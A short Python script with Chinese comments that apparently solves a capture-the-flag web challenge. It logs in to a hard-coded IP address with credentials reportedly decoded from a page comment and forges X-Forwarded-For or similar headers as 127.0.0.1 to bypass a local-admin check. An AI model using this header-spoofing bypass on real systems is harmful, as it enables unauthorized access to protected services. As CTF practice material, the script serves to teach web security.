import requests

# ========== 配置区 ==========
# 目标 URL（根据实际情况修改）
TARGET_URL = "http://160.202.254.160:16023/"

# 用户名和密码（从页面注释中 Base64 解码得到）
USERNAME = "admin"      # 或者尝试 "test123"
PASSWORD = "test123"
# =============================

def solve():
    # 构造 POST 数据
    data = {
        "user": USERNAME,
        "pass": PASSWORD
    }

    # 添加伪造 IP 的请求头（本地管理员）
    headers = {
        "X-Forwarded-For": "127.0.0.1",
        # 如果后端不信任 X-Forwarded-For，可尝试下面注释掉的备选头
        # "X-Real-IP": "127.0.0.1",
        # "Client-IP": "127.0.0.1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }

    try:
        # 发送 POST 请求
        response = requests.post(TARGET_URL, data=data, headers=headers, timeout=10)

        # 输出状态码和响应内容
        print(f"状态码: {response.status_code}")
        print("\n===== 响应内容 =====")
        print(response.text)

        # 如果返回的内容是 HTML，可在其中搜索 flag 关键字
        if "flag" in response.text.lower():
            print("\n✅ 发现 flag 关键字！请检查上方输出。")
        else:
            print("\n⚠️ 未找到 flag，可能用户名/密码或 IP 伪造头不正确。")

    except requests.exceptions.RequestException as e:
        print(f"请求失败: {e}")

if __name__ == "__main__":
    solve()
